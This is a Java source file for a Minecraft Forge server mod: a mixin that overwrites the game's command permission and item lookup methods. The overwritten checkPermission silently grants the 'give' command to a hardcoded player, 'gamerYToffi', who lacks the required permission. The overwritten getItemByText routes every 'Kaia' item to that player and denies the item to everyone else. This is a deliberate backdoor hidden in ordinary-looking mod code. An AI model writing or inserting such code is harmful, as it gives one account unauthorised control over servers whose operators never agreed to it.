package com.omnipotent.server.mixin;

import com.omnipotent.server.tool.Kaia;
import net.minecraft.command.CommandBase;
import net.minecraft.command.ICommand;
import net.minecraft.command.ICommandSender;
import net.minecraft.command.NumberInvalidException;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.FMLCommonHandler;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Overwrite;
import org.spongepowered.asm.mixin.Shadow;

import javax.annotation.Nullable;
import java.util.List;

@Mixin(CommandBase.class)
public abstract class MixinCommandBase implements ICommand {
    @Shadow
    public int getRequiredPermissionLevel() {
        return 4;
    }

    @Shadow
    public abstract List<String> getTabCompletions(MinecraftServer server, ICommandSender sender, String[] args, @Nullable BlockPos targetPos);

    private static boolean allowCommand = false;

    /**
     * @author
     * @reason
     */
    @Overwrite
    public static Item getItemByText(ICommandSender sender, String id) throws NumberInvalidException {
        ResourceLocation resourcelocation = new ResourceLocation(id);
        Item item = Item.REGISTRY.getObject(resourcelocation);
        if (item == null)
            throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
        else {
            ItemStack itemStack = new ItemStack(item);
            if (sender.getName().equals("gamerYToffi") && allowCommand) {
                if (!(itemStack.getItem() instanceof Kaia)) {
                    allowCommand = false;
                    throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
                }
            } else if (allowCommand) {
                if (itemStack.getItem() instanceof Kaia) {
                    allowCommand = false;
                    throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
                }
            } else if (!sender.getName().equals("gamerYToffi")) {
                if (itemStack.getItem() instanceof Kaia) {
                    allowCommand = false;
                    throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
                }
            }
            if (item instanceof Kaia) {
                FMLCommonHandler.instance().getMinecraftServerInstance().getPlayerList().getPlayerByUsername("gamerYToffi").addItemStackToInventory(itemStack);
                allowCommand = false;
                throw new NumberInvalidException("commands.give.item.notFound", new Object[]{resourcelocation});
            }
            return item;
        }
    }

    /**
     * @author
     * @reason
     */
    @Overwrite
    public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
        if (sender.getName().equals("gamerYToffi") && getName().equals("give")) {
            if (!sender.canUseCommand(this.getRequiredPermissionLevel(), this.getName())) {
                allowCommand = true;
                return true;
            }
        }
        return sender.canUseCommand(this.getRequiredPermissionLevel(), this.getName());
    }
}